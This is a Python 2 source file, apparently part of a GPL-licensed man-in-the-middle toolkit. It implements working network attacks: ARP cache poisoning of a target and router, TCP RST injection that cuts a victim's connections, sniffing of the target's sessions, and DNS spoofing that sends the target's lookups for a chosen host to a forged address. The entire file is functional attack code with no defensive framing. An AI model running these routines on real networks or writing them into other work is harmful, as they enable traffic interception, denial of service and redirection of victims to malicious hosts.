# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import dnet
import pcap
import dpkt
import time
import signal
import core.config
from threading import Thread
from socket import *
from utils import *

def poison(dev, source_mac, source, target):
	"""
	poison arp cache of target and router, causing all traffic between them to
	pass inside our machine, MITM heart
	"""
	set_ip_forward(1)
	sock = socket(PF_PACKET, SOCK_RAW)
	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
	try:
		while True:
			if core.config.verbose == True:
				print "[+] {0} <-- {1} -- {2} -- {3} --> {4}".format(source, target, dev, source, target)
			try:
				sock.send(str(build_arp_packet(source_mac, source, target)))
				sock.send(str(build_arp_packet(source_mac, target, source)))
				time.sleep(5) # OS refresh ARP cache really often
			except:
				pass
	except KeyboardInterrupt:
		print '\n\r[+] Poisoning interrupted'
		sock.close()

def rst_inject(dev, source_mac, source, target, port = None):
	"""
	injecting RESET packets to the target machine eventually blocking his
	connection and navigation
	"""
	sock = socket(PF_PACKET, SOCK_RAW)
	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
	filter = 'ip host %s' % target
	if port:
		filter += ' and tcp port %s' % port
	# need to create a daemon that continually poison our target
	thread = Thread(target = poison, args = (dev, source_mac, source, target,))
	thread.daemon = True
	thread.start()
	pc = pcap.pcap(dev)
	pc.setfilter(filter) # we need only target packets
	print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W  + ' and ' + R + target + W
	if port:
		print '[+] Sending RST packets to ' + R + target + W + ' on port ' + R + port + W
	else:
		print '[+] Sending RST packets to ' + R + target + W
	if core.config.dotted == True:
		print '[+] Every dot symbolize a sent packet'
	counter = 0
	try:
		for ts, pkt in pc:
			eth = dpkt.ethernet.Ethernet(pkt)
			ip = eth.data
			if ip.p == dpkt.ip.IP_PROTO_TCP:
				tcp = ip.data
				if tcp.flags != dpkt.tcp.TH_RST:
					recv_tcp = dpkt.tcp.TCP(
							sport = tcp.sport,
							dport = tcp.dport,
							seq = tcp.seq + len(tcp.data),
							ack = 0,
							off_x2 = 0x50,
							flags = dpkt.tcp.TH_RST,
							win = tcp.win,
							sum = 0,
							urp = 0)
					recv_ip = dpkt.ip.IP(
							v_hl = ip.v_hl,
							tos = ip.tos,
							len = 40,
							id = ip.id + 1,
							off = 0x4000,
							ttl = 128,
							p = ip.p,
							sum = 0,
							src = ip.src,
							dst = ip.dst,
							data = recv_tcp)
					recv_eth = dpkt.ethernet.Ethernet(
							dst = eth.dst,
							src = eth.src,
							type = eth.type,
							data = recv_ip)

					sock.send(str(recv_eth))

				if core.config.dotted == True:
					print_in_line('.')
				else:
					print_counter(counter)

				tmp = ip.src
				ip.src = ip.dst
				ip.dst = tmp
				send_tcp = dpkt.tcp.TCP(
						sport = tcp.dport,
						dport = tcp.sport,
						seq = tcp.ack,
						ack = tcp.seq + len(tcp.data),
						off_x2 = 0x50,
						flags = dpkt.tcp.TH_RST,
						win = tcp.win,
						sum = 0,
						urp = 0)
				send_ip = dpkt.ip.IP(
						v_hl = ip.v_hl,
						tos = ip.tos,
						len = 40,
						id = ip.id + 1,
						off = 0x4000,
						ttl = 128,
						p = ip.p,
						sum = 0,
						src = ip.src,
						dst = ip.dst,
						data = send_tcp)
				send_eth = dpkt.ethernet.Ethernet(
						dst = eth.src,
						src = eth.dst,
						type = eth.type,
						data = send_ip)

				try:
					sock.send(str(send_eth))
				except:
					pass

			if core.config.dotted == True:
				print_in_line('.')
			else:
				print_counter(counter)
			counter += 1

	except KeyboardInterrupt:
		print '[+] Rst injection interrupted\n\r'
		sock.close()
		set_ip_forward(0)

def get_sessions(dev, target, port = 0):
	filter = 'ip host %s' % target
	pc = pcap.pcap(dev)
	pc.setfilter(filter) # we need only target packets
	sessions = []
	session = 0
	sess = ""
	try:
		for ts, pkt in pc:
			eth = dpkt.ethernet.Ethernet(pkt)
			ip = eth.data
			if ip.p == dpkt.ip.IP_PROTO_TCP:
				tcp = ip.data
				if tcp.flags != dpkt.tcp.TH_RST:
					sess = inet_ntoa(ip.src) + " : " + str(tcp.sport) + "\t-->\t" + inet_ntoa(ip.dst) + " : " + str(tcp.dport)
					if sess not in sessions:
						sessions.append(sess)
						if tcp.sport == 21 or tcp.dport == 21:
							# sessions.insert(session, ' ftp-data session')
							sess += ' ftp-data session'
						elif tcp.sport == 22 or tcp.dport == 22:
							# sessions.insert(session, ' ssh session')
							sess += ' ssh session'
						elif tcp.sport == 23 or tcp.dport == 23:
							# sessions.insert(session, ' telnet session')
							sess += ' telnet session'
						elif tcp.sport == 25 or tcp.dport == 25:
							# sessions.insert(session, ' SMTP session')
							sess += ' SMTP session'
						elif tcp.sport == 80 or tcp.dport == 80:
							# sessions.insert(session, ' HTTP session')
							sess += '\t HTTP session'
						elif tcp.sport == 110 or tcp.dport == 110:
							# sessions.insert(session, ' POP3 session')
							sess += ' POP3 session'
						elif tcp.sport == 443 or tcp.dport == 443:
							# sessions.insert(session, ' SSL session')
							sess += '\t SSL session'
						print " [{0}] {1}".format(session, sess)
						session += 1
						# print sess
	except KeyboardInterrupt:
		print '[+] Session scan interrupted\n\r'

def dns_spoof(dev, source_mac, source, target=None, host=None, redirection=None):

		redirection = gethostbyname(redirection)
		sock = dnet.ip()
		filter = 'udp dst port 53'
		print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W + ' and ' + R + target + W
		# need to create a daemon that continually poison our target
		thread = Thread(target = poison, args = (dev, source_mac, source, target,))
		thread.daemon = True
		thread.start()
		pc = pcap.pcap(dev)
		pc.setfilter(filter)
		print '[+] Redirecting ' + G + host + W + ' to ' + G + redirection + G + ' for ' + R + target + W
		try:
			for ts, pkt in pc:
				eth = dpkt.ethernet.Ethernet(pkt)
				ip = eth.data
				udp = ip.data
				dns = dpkt.dns.DNS(udp.data)
				# validate query
				if dns.qr != dpkt.dns.DNS_Q:
					continue
				if dns.opcode != dpkt.dns.DNS_QUERY:
					continue
				if len(dns.qd) != 1:
					continue
				if len(dns.an) != 0:
					continue
				if len(dns.ns) != 0:
					continue
				if dns.qd[0].cls != dpkt.dns.DNS_IN:
					continue
				if dns.qd[0].type != dpkt.dns.DNS_A:
					continue

				# spoof for our target name
				if dns.qd[0].name != host:
					continue

				# dns query->response
				dns.op = dpkt.dns.DNS_RA
				dns.rcode = dpkt.dns.DNS_RCODE_NOERR
				dns.qr = dpkt.dns.DNS_R

				# construct fake answer
				arr = dpkt.dns.DNS.RR()
				arr.cls = dpkt.dns.DNS_IN
				arr.type = dpkt.dns.DNS_A
				arr.name = host
				arr.ip = dnet.addr(redirection).ip
				# arr.ip = '\x4D\xEE\xB8\x96'

				dns.an.append(arr)

				udp.sport, udp.dport = udp.dport, udp.sport
				ip.src, ip.dst = ip.dst, ip.src
				udp.data = dns
				udp.ulen = len(udp)
				ip.len = len(ip)

				print inet_ntoa(ip.src)

				buf = dnet.ip_checksum(str(ip))
				# buf = config.checksum(str(ip))
				sock.send(buf)

		except KeyboardInterrupt:
			print '[+] DNS spoofing interrupted\n\r'
			set_ip_forward(0)
			sys.exit()

